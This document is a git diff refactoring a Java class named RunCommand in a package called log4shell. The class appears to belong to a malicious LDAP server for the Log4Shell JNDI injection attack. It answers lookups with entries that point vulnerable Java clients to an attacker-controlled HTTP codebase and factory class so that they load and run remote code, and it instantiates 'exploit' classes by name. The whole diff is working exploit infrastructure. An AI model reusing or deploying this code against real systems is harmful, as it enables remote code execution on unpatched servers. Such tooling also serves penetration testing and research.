@@ -3,21 +3,20 @@ package log4shell;
 import com.unboundid.ldap.sdk.DN;
 import com.unboundid.ldap.sdk.Entry;
 
-import java.lang.reflect.Constructor;
-import java.lang.reflect.InvocationTargetException;
-
 public final class RunCommand extends Command {
-  private final String codebase;
+  private final Config config;
   private final String className;
 
-  public RunCommand(DN dn, String codebase, String className) {
+  public RunCommand(DN dn, Config config, String className) {
     super(dn);
-    this.codebase = codebase;
+    this.config = config;
     this.className = className;
   }
 
   @Override
   public Entry response() {
+    String codebase = config.getHttpServerUri().toASCIIString();
+
     System.out.printf(
         "Send LDAP entry for DN «%s» redirecting to code base «%s»%n", getDn(), codebase);
 
@@ -27,7 +26,7 @@ public final class RunCommand extends Command {
     entry.addAttribute("objectClass", "javaObject");
     entry.setAttribute("javaCodeBase", codebase);
 
-    serializedObject(entry);
+    serializedObject(entry, codebase);
 
     return entry;
   }
@@ -38,7 +37,7 @@ public final class RunCommand extends Command {
     entry.setAttribute("javaFactory", className);
   }
 
-  private void serializedObject(Entry entry) {
+  private void serializedObject(Entry entry, String codebase) {
     entry.addAttribute("objectClass", "javaSerializedObject");
 
     try {
@@ -58,18 +57,16 @@ public final class RunCommand extends Command {
 
   private Object newExploitInstance()
       throws ClassNotFoundException, InstantiationException, IllegalAccessException {
+
     Class<?> klass = Class.forName(className);
-    try {
-      Constructor<?> constructor = klass.getConstructor(DN.class);
-      return constructor.newInstance(getDn().getParent());
-    } catch (NoSuchMethodException
-        | SecurityException
-        | InvocationTargetException
-        | IllegalAccessException e) {
-      return klass.newInstance();
-    } catch (InstantiationException e) {
-      e.printStackTrace();
-      return klass.newInstance();
+    Object instance = klass.newInstance();
+
+    if (instance instanceof WithParams) {
+      ((WithParams) instance).setParams(getDn().getParent());
     }
+    if (instance instanceof WithHttpServerUri) {
+      ((WithHttpServerUri) instance).setHttpServerUri(config.getHttpServerUri());
+    }
+    return instance;
   }
 }
